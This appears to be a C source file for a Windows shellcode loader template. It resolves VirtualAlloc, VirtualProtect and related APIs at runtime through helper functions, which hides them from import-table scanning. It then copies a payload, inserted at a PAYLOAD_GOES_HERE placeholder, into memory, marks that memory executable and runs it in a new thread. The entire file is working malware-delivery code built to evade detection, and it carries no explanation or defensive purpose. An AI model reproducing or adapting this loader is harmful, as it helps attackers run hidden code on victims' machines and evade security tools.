#include <windows.h>
   #include <stdio.h>
   #include <stdlib.h>
   #include <string.h>
   #include <wincrypt.h>
   #pragma comment (lib, "crypt32.lib")
   #pragma comment (lib, "advapi32")
   #include <psapi.h>
   #include "helpers.h"
   
   
   typedef LPVOID (WINAPI * VirtualAlloc_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
   typedef VOID (WINAPI * RtlMoveMemory_t)(VOID UNALIGNED *Destination, const VOID UNALIGNED *Source, SIZE_T Length);
   typedef BOOL (WINAPI * VirtualProtect_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
   typedef DWORD (WINAPI * WaitForSingleObject_t)(HANDLE hHandle, DWORD  dwMilliseconds);
   typedef HANDLE (WINAPI * CreateThread_t)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE  lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags,LPDWORD lpThreadId);
  
  PAYLOAD_GOES_HERE 
   
   int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
       
   	void * exec_mem;
   	BOOL rv;
   	HANDLE th;
           DWORD oldprotect = 0;
   
   	VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "VirtualAlloc");
   	RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "RtlMoveMemory");
   	VirtualProtect_t pVirtualProtect = (VirtualProtect_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "VirtualProtect");
   	WaitForSingleObject_t pWaitForSingleObject = (WaitForSingleObject_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "WaitForSingleObject");
   
   
   	unsigned int payload_len = sizeof(payload);
   	
   	exec_mem = pVirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
   
   	
   	pRtlMoveMemory(exec_mem, payload, payload_len);
   	
   	rv = pVirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
   
   	if ( rv != 0 ) {
   			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
   			pWaitForSingleObject(th, -1);
   	}
   
   	return 0;
   }
    
